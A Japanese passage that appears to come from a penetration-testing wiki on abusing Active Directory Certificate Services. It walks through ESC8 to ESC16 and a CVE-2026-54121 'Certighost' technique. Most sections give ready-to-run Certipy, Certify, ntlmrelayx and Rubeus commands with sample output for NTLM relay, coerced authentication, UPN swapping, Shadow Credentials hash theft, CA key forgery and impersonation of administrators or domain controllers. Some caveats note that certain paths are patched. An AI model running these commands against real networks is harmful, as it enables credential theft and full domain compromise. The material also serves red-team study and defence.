NTLM relay attacks のもう 1 つの制限は、**被害アカウントが攻撃者の管理するマシンに認証する必要がある**ことです。攻撃者は、その認証を待つか、認証を**強制**しようとすることができます。


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **悪用**

[**Certify**](https://github.com/GhostPack/Certify) の `cas` は、**有効な HTTP AD CS endpoint** を列挙します。<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ認証局（CA）が Certificate Enrollment Service（CES）のエンドポイントを保存するために使用されます。これらのエンドポイントは、**Certutil.exe** を使用して解析し、一覧表示できます。

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyの悪用

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy)を使った悪用

Certipyはデフォルトで、リレーされるアカウント名が`$`で終わるかどうかに応じて、`Machine`または`User`テンプレートを使用して証明書を要求します。別のテンプレートを指定するには、`-template`パラメーターを使用します。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のような手法を使って認証を強制できます。ドメインコントローラーを対象とする場合は、`-template DomainController`を指定する必要があります。

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## セキュリティ拡張なし - ESC9 <a href="#id-5485" id="id-5485"></a>

### 説明

ESC9 と呼ばれる **`msPKI-Enrollment-Flag`** の **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) 値は、証明書から `szOID_NTDS_CA_SECURITY_EXT` SID 拡張を省略します。古い ESC9 の例は、KDC の互換動作（`StrongCertificateBindingEnforcement=1`）または別の弱い Schannel マッピング経路に依存しています。値 `1` は**過去の互換設定**であり、現在のデフォルトではありません。Microsoft によると、KDC のオーバーライドは 2025 年 9 月 9 日の Windows セキュリティ更新プログラムでサポートされなくなりました。古い手順を適用する前に、対象の実際の更新状況と認証エンドポイントを確認してください。<sup>[[7]](#references)</sup> [Microsoft の展開ガイダンス](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)を参照してください。

このフラグの設定が重要になる条件は次のとおりです。

- 古い互換性のある KDC では、有効な証明書バインドポリシーによってマッピングが許可されていること。または、Schannel エンドポイントで `CertificateMappingMethods` のビット `0x4` による UPN マッピングが別途有効になっていること。
- 証明書の `msPKI-Enrollment-Flag` 設定で、`CT_FLAG_NO_SECURITY_EXTENSION` フラグが指定されていること。
- 証明書でクライアント認証 EKU が指定されていること。
- 別のアカウントを侵害するための `GenericWrite` 権限が、いずれかのアカウントに対してあること。

### 悪用シナリオ

`John@corp.local` が `Jane@corp.local` に対する `GenericWrite` 権限を持っており、`Administrator@corp.local` の侵害を目的としているとします。`Jane@corp.local` が登録を許可されている `ESC9` 証明書テンプレートでは、`msPKI-Enrollment-Flag` 設定に `CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定されています。

まず、`John` の `GenericWrite` 権限を利用して Shadow Credentials で `Jane` のハッシュを取得します。

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

その後、`Jane`の`userPrincipalName`は、意図的に`@corp.local`のドメイン部分を省略して`Administrator`に変更されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

この変更は制約に違反しません。`Administrator@corp.local` は引き続き `Administrator` の `userPrincipalName` として区別されるためです。

続いて、脆弱と判定された `ESC9` 証明書テンプレートを `Jane` として要求します：

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

証明書の `userPrincipalName` は `Administrator` を反映しており、「object SID」は含まれていないことが確認されています。

その後、`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

発行された証明書で認証を試みると、`Administrator@corp.local` の NT hash が得られます。証明書にドメインの指定がないため、コマンドには `-domain <domain>` を含める必要があります。

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Weak Certificate Mappings - ESC10

### 説明

ESC10では、別々の2つの証明書マッピングポリシーがよく取り上げられます。関連する認証を実際に処理するエンドポイントの設定を確認してください。

- Schannel の `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` にある `CertificateMappingMethods` は、アプリケーションサーバー上での TLS クライアント証明書マッピングを制御します。UPN ビットは `0x4` です。更新済みシステムでのデフォルト値は `0x18`（`0x8 | 0x10`）です。
- KDC の `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` にある `StrongCertificateBindingEnforcement` は、従来、Kerberos の証明書バインディング互換性を制御していました。値 `1` は現在のデフォルトとして信頼できるものではなく、Microsoft は2025年9月9日の Windows セキュリティ更新プログラムをもって、この上書き設定のサポートを終了しました。この設定の状態だけでは、Schannel の UPN マッピングは判断できません。<sup>[[7]](#references)</sup>

**ケース 1**

従来、古い KDC が `StrongCertificateBindingEnforcement=0` を有効として扱っていた場合。現在のパッチ適用済みシステムではこの上書き設定がサポートされなくなったため、更新レベルを確認してください。

**ケース 2**

Schannel のクライアント証明書エンドポイントで、`CertificateMappingMethods` の UPN ビット（`0x4`）が有効になっている場合。これは KDC の強いバインディング適用とは別の設定であり、なお、登録可能なクライアント認証証明書と、マッピング先アカウントの属性に対する有効な制御が必要です。

### Abuse Case 1

KDC が `StrongCertificateBindingEnforcement=0` を引き続き有効として扱う古い環境では、アカウントの `userPrincipalName` を制御することが、別のアカウントへの弱いマッピング経路の一部となる可能性があります。必要な証明書登録、マッピング、ターゲット ID、および認証の成功はそれぞれ個別に確認する必要があります。`GenericWrite` ACE やレジストリ値だけでは、アカウントの乗っ取りが可能だとは判断できません。

たとえば、攻撃者が `Jane@corp.local` に対する `GenericWrite` 権限を持ち、`Administrator@corp.local` の侵害を狙うとします。この手順は ESC9 と同様で、任意の証明書テンプレートを利用できます。

まず、`GenericWrite` を悪用して Shadow Credentials により `Jane` のハッシュを取得します。

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

続いて、制約違反を避けるため、`@corp.local` 部分を意図的に省略して、`Jane` の `userPrincipalName` が `Administrator` に変更されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

次に、デフォルトの `User` テンプレートを使用し、`Jane` としてクライアント認証用の証明書を要求します。

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` の `userPrincipalName` はその後、元の `Jane@corp.local` に戻されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

取得した証明書で認証すると `Administrator@corp.local` の NT hash が得られます。証明書にドメイン情報が含まれていないため、コマンドでドメインを指定する必要があります。

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Abuse Case 2

`CertificateMappingMethods` に `UPN` ビットフラグ（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B を侵害できます。これには、マシンアカウントや組み込みのドメイン管理者 `Administrator` も含まれます。

ここでは、`GenericWrite` を活用して `Shadow Credentials` 経由で `Jane` の hash を取得し、`DC$@corp.local` を侵害することが目標です。

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane` の `userPrincipalName` は、その後 `DC$@corp.local` に設定されます。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

デフォルトの `User` テンプレートを使用して、`Jane` としてクライアント認証用の証明書が要求されます。

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` の `userPrincipalName` は、このプロセスの後に元の値に戻ります。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel 経由で認証するには、Certipy の `-ldap-shell` オプションを使用します。認証が成功すると、`u:CORP\DC$` と表示されます。

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell では、`set_rbcd` などのコマンドにより Resource-Based Constrained Delegation (RBCD) 攻撃を実行でき、ドメインコントローラーが侵害される可能性があります。

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

この脆弱性は、`userPrincipalName` が設定されていないユーザーアカウント、またはその値が `sAMAccountName` と一致しないユーザーアカウントにも及びます。デフォルトでは `userPrincipalName` が設定されておらず、LDAP 権限も高い `Administrator@corp.local` は、特に有力なターゲットです。

## ICPRへのNTLMリレー - ESC11

### 説明

CA Server で `IF_ENFORCEENCRYPTICERTREQUEST` が設定されていない場合、RPC service 経由で署名なしの NTLM relay attacks を実行できます。[参考はこちら](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。<sup>[[10]](#references)</sup>

`certipy` を使って `Enforce Encryption for Requests` が無効かどうかを列挙できます。無効の場合、certipy は `ESC11` の脆弱性を表示します。

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### 悪用シナリオ

中継サーバーをセットアップする必要があります:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

注: ドメインコントローラーの場合は、DomainControllerで `-template` を指定する必要があります。

または、[sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用します:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## YubiHSM を使用した ADCS CA への Shell access - ESC12

### 説明

管理者は、Certificate Authority を「Yubico YubiHSM2」のような外部デバイスに保存するよう設定できます。

CA サーバーに USB デバイスが USB ポート経由で接続されている場合、または CA サーバーが仮想マシンで USB デバイスサーバーを使用している場合、YubiHSM でキーを生成して利用するには、Key Storage Provider に認証キー（「パスワード」と呼ばれることもあります）が必要です。

このキー／パスワードは、レジストリの `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に平文で保存されています。

[こちら](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)を参照してください。<sup>[[11]](#references)</sup>

### Abuse Scenario

Shell access を取得したときに、CA の秘密キーが物理的な USB デバイスに保存されている場合、そのキーを回収できます。

まず、CA 証明書（これは公開されています）を取得し、次に以下を実行します。

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

最後に、CA certificate とその private key を使用して、certutil `-sign` コマンドで任意の新しい certificate を偽造します。

## OID Group Link Abuse - ESC13

### 説明

`msPKI-Certificate-Policy` 属性を使用すると、証明書テンプレートに発行ポリシーを追加できます。発行ポリシーを管理する `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナーの Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) で確認できます。`msDS-OIDToGroupLink` 属性を使用して、このオブジェクトのポリシーを AD グループにリンクできます。これにより、証明書を提示したユーザーを、そのグループのメンバーであるかのようにシステムに認識させることができます。[Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

つまり、ユーザーが証明書の登録権限を持ち、その証明書が OID グループにリンクされている場合、ユーザーはそのグループの権限を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用して OIDToGroupLink を見つけます:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Abuse Scenario

`certipy find` または `Certify.exe find /showAllPermissions` を使って、ユーザーが利用できる権限を見つけます。

`John` に `VulnerableTemplate` への登録権限がある場合、そのユーザーは `VulnerableGroup` グループの特権を継承できます。

必要なのはテンプレートを指定するだけです。これにより、`OIDToGroupLink` 権限を持つ証明書を取得できます。

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Explicit Certificate Mapping Abuse — ESC14

### 説明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の説明は非常に詳細です。以下は原文からの引用です。<sup>[[14]](#references)</sup>

ESC14 は、主に Active Directory のユーザーまたはコンピューターアカウントにある `altSecurityIdentities` 属性の誤用や安全でない設定によって生じる、「弱い明示的な証明書マッピング」の脆弱性を扱います。この複数値属性を使用すると、管理者は認証目的で X.509 証明書を AD アカウントに手動で関連付けられます。この属性が設定されている場合、通常は証明書の SAN に含まれる UPN や DNS 名、または `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張に埋め込まれた SID に依存するデフォルトの証明書マッピングロジックを、これらの明示的マッピングで上書きできます。

`altSecurityIdentities` 属性内で証明書を識別するために使われる文字列が広範すぎる、推測しやすい、一意でない証明書フィールドに依存している、または簡単に偽装できる証明書コンポーネントを使っている場合、そのマッピングは「弱い」とされます。攻撃者が、特権アカウントに設定された弱い明示的マッピングと一致する属性を持つ証明書を入手または作成できれば、その証明書を使って当該アカウントとして認証し、なりすますことができます。

弱い可能性のある `altSecurityIdentities` マッピング文字列の例:

- 一般的な Subject Common Name (CN) のみでマッピングする。例: `X509:<S>CN=SomeUser`。攻撃者は、セキュリティの低いソースからこの CN を持つ証明書を入手できる可能性があります。
- 特定のシリアル番号や subject key identifier などによる追加の限定なしに、汎用的すぎる Issuer Distinguished Name (DN) や Subject DN を使用する。例: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が正当に入手または偽造できる証明書で満たせる、その他の予測可能なパターンや暗号学的でない識別子を使用する（CA を侵害している場合や、ESC1 のような脆弱なテンプレートを見つけた場合）。

`altSecurityIdentities` 属性は、次のような複数のマッピング形式に対応しています:

- `X509:<I>IssuerDN<S>SubjectDN`（Issuer と Subject の完全な DN でマッピング）
- `X509:<SKI>SubjectKeyIdentifier`（証明書の Subject Key Identifier 拡張値でマッピング）
- `X509:<SR>SerialNumberBackedByIssuerDN`（Issuer DN で暗黙的に限定したシリアル番号でマッピング） - これは標準形式ではなく、通常は `<I>IssuerDN<SR>SerialNumber` です。
- `X509:<RFC822>EmailAddress`（SAN の RFC822 名、通常はメールアドレスでマッピング）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（証明書の raw public key の SHA1 ハッシュでマッピング - 一般に強固です）

これらのマッピングの安全性は、マッピングに使われる識別子によって決まります。Microsoft は、`X509:<RFC822>` を含むメールアドレスや Subject 名に基づくマッピングを**弱い**と分類しています。Full Enforcement モードでは、強固なマッピングのない証明書は拒否されます。また、2025 年 9 月の Windows セキュリティ更新プログラムにより、Compatibility モードに戻すオプションは削除されました。したがって、弱いマッピングだけでは、現在確実に利用できるなりすまし経路とは言えません。弱いマッピングのシナリオを評価する前に、ドメインコントローラーの実際のパッチレベルと証明書マッピングの挙動を確認してください。`altSecurityIdentities` への書き込み権限は別の調査の手がかりです。適切な信頼済み証明書を持つ攻撃者は、有効な権限と証明書の検証条件に応じて、**強固な**明示的マッピングを追加できる場合があります。[Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) および [ESC14 の調査](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/) を参照してください。

証明書認証に失敗した場合は、原因の診断も必要です。対象アカウントが無効になっている場合やパスワードの有効期限が切れている場合、証明書自体が有効でもログインできないことがあります。

### Abuse Scenario

ESC14 は、Active Directory (AD) の**明示的な証明書マッピング**、特に `altSecurityIdentities` 属性を標的にします。この属性が設定されている場合（設計によるものでも、設定ミスによるものでも）、攻撃者はマッピングに一致する証明書を提示してアカウントになりすますことができます。

#### シナリオ A: 攻撃者が `altSecurityIdentities` に書き込める

 **前提条件**: 攻撃者が対象アカウントの `altSecurityIdentities` 属性への書き込み権限を持つか、対象 AD オブジェクトに次のいずれかの権限を付与できること。  
- プロパティ `altSecurityIdentities` への書き込み  
- プロパティ `Public-Information` への書き込み  
- すべてのプロパティへの書き込み  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.

#### シナリオ B: 対象に X509RFC822（メールアドレス）による弱いマッピングがある

- **歴史的または条件付きの前提条件**: 対象の `altSecurityIdentities` に弱い X509RFC822 マッピングがあり、攻撃者が登録者の `mail` 属性を編集でき、適切なテンプレートが競合する SID バインディングなしで、そのメールアドレスをクライアント認証証明書に含めること。認証には、弱いマッピングが引き続き受け入れられる環境も必要です。Full Enforcement では、弱いマッピングのみの証明書は拒否されます。書き込み可能な `mail` 属性だけでは、調査の手がかりにすぎません。

#### シナリオ C: 対象に X509IssuerSubject マッピングがある

- **前提条件**: 対象の `altSecurityIdentities` に弱い X509IssuerSubject 明示的マッピングがあること。攻撃者が被害者プリンシパルの `cn` または `dNSHostName` 属性を、対象の X509IssuerSubject マッピングの Subject と一致するように設定できること。その後、攻撃者は被害者として証明書を登録し、その証明書を使って対象として認証できます。

#### シナリオ D: 対象に X509SubjectOnly マッピングがある

- **前提条件**: 対象の `altSecurityIdentities` に弱い X509SubjectOnly 明示的マッピングがあること。攻撃者が被害者プリンシパルの `cn` または `dNSHostName` 属性を、対象の X509SubjectOnly マッピングの Subject と一致するように設定できること。その後、攻撃者は被害者として証明書を登録し、その証明書を使って対象として認証できます。

### 具体的な操作
#### シナリオ A

証明書テンプレート `Machine` の証明書を要求します。

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 証明書を保存して変換する

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 認証する（証明書を使用）

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

クリーンアップ（任意）

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

さまざまな攻撃シナリオにおける、より具体的な攻撃手法については、以下を参照してください: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 説明

[ESC15に関する元の調査](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)では、V1 templateへのリクエストに含めた application policies によって、**未パッチの発行CA**で設定済みの Extended Key Usage を上書きできる仕組みが説明されています。<sup>[[15]](#references)</sup> さらに、必要な subject/request プロパティを許可し、承認や署名によるブロックがない、公開済みで登録可能な template も必要です。登録権限があるだけでは、悪用可能であることの証明にはなりません。Certificate Request Agent の使用には、適切な2つ目の template と enrollment-agent restrictions が必要となる場合もあります。この経路を主張する前に、CAのパッチ適用状況と証明書の発行結果を確認してください。

### 悪用

[Certipyの権限昇格に関するドキュメント](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)に、より詳細な使用例が記載されています。<sup>[[14]](#references)</sup>


Certipyの`find`コマンドを使うと、CAにパッチが適用されていない場合にESC15の影響を受ける可能性があるV1 templateを特定できます。

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### シナリオ A: Schannel 経由の直接なりすまし

**ステップ 1: 証明書を要求し、「Client Authentication」Application Policy と対象の UPN を注入する。** 攻撃者 `attacker@corp.local` は、登録者が指定したサブジェクトを許可する「WebServer」V1 template を使用して、`administrator@corp.local` を標的にする。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: 「Enrollee supplies subject」が設定された脆弱なV1テンプレート。
- `-application-policies 'Client Authentication'`: CSRのApplication Policies拡張にOID `1.3.6.1.5.5.7.3.2`を挿入します。
- `-upn 'administrator@corp.local'`: なりすまし用にSANのUPNを設定します。

**Step 2: 取得した証明書を使用して、Schannel（LDAPS）経由で認証します。**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### シナリオ B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**ステップ 1: 「Enrollee supplies subject」を設定した V1 template から証明書を要求し、「Certificate Request Agent」Application Policy を注入する。** この証明書は、攻撃者 (`attacker@corp.local`) が enrollment agent になるためのものです。目的は agent としての権限を得ることなので、ここでは攻撃者自身の ID に UPN を指定しません。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**Step 2: "agent" 証明書を使って、特権ユーザーを対象として証明書を要求します。** これはESC3に似た手順で、Step 1で取得した証明書をagent証明書として使います。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**ステップ 3: 「on-behalf-of」証明書を使用して、特権ユーザーとして認証する。**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CAでSecurity Extensionが無効（グローバル）-ESC16

### 説明

**ESC16（szOID_NTDS_CA_SECURITY_EXT Extensionの欠如による権限昇格）**は、CA全体で**szOID_NTDS_CA_SECURITY_EXT** SID extensionを抑制する設定を指します。これは設定上の指標であり、証明書で別のアカウントとして認証できることを証明するものではありません。なりすましには、関連するアカウント属性またはマッピングを制御できること、登録可能なクライアント認証テンプレート、そして実際のドメインコントローラーまたはサービスが受け入れる証明書マッピング経路も必要です。Full Enforcementのパッチ適用済みKDCは、別の強力なマッピングがない限り、SID extensionのない証明書を拒否します。以下のUPN-only Kerberos手順は、弱いマッピングを引き続き受け入れる旧式または互換モードのKDCに適用されます。[Microsoftの証明書マッピングと強制に関するガイダンス](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)を参照してください。

詳細な原理については、こちらの記事も参照してください:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### 悪用

以下の歴史的なUPN-only Kerberosの例は、[CertipyのESC16ドキュメント](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)に基づいています。これは、結果として生じる弱いマッピングを引き続き受け入れるKDCを必要とします。`StrongCertificateBindingEnforcement=1`は、2025年9月9日のWindowsセキュリティ更新プログラム以降、サポートされるオーバーライドではありません。<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS)環境が**ESC16**に対して脆弱かどうかを特定するには、次の手順を実行します。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**ステップ1: 被害者アカウントの初期UPNを読み取る（任意 - 復元用）。**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**ステップ 2: 被害者アカウントの UPN を、標的の管理者の `sAMAccountName` に更新します。  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**ステップ 3: (必要に応じて)「victim」アカウントの認証情報を取得する (例: Shadow Credentials を使用)。**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Step 4: アカウントが登録できる client-authentication template（例: "User"）から、ESC16-configured CA 上で「victim」ユーザーとして証明書を要求します。** CA は発行する証明書から SID security extension を省略しますが、これだけでは使用可能な authentication mapping が確立されません。Kerberos credential cache の環境変数を設定します（shell command）：

```bash
export KRB5CCNAME=victim.ccache
```

次に、証明書を要求します:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**ステップ 5: 「victim」アカウントの UPN を元に戻します。**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**ステップ 6: この弱いマッピングを受け入れる古い KDC または互換モードの KDC で、対象の管理者として認証します。**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution（Certighost / CVE-2026-54121）

### 説明

**Certighost** は、CAが発行する証明書に設定すべきIDを解決する際、要求者が指定したrequest attributesを信頼する **AD CS enrollment chase / callback path** を悪用します。公開PoCでは、細工したリクエストに次の値を含めます。<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CAが接続する、攻撃者が制御するホスト/IP
- **`rmd`**: なりすまし対象の **Domain ControllerのDNS名**

CAがこのchaseに従うと、**SMB/LSA（`445`）** と **LDAP（`389`）** で攻撃者に接続します。攻撃者は、callbackセッションが有効なドメインプリンシパルとして認証されるよう、**実在するマシンアカウント**（通常は既定の **`ms-DS-MachineAccountQuota`** を利用して作成）を使います。その一方で、不正なサービスは次の属性について、**対象DC** の値を返します。

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CAが**返されたIDを認証済みcallbackプリンシパルに暗号学的に紐付けて検証しない**場合、セッションが攻撃者の制御するマシンアカウントとして認証されているにもかかわらず、**Domain Controller用の証明書**を発行する可能性があります。この点で、このバグは概念的に **Certifried** とは異なります。攻撃者は `dNSHostName` などのAD属性を書き換えるのではなく、**CAのcallbackによる解決中にIDデータをすり替えます**。<sup>[[2]](#references)</sup>

**有用な前提条件:**

- 低権限の**ドメイン認証情報**
- コンピューターアカウントを**作成または再利用**できること
- **CA** から攻撃者が制御するポート **`389` と `445`** へのネットワーク到達性
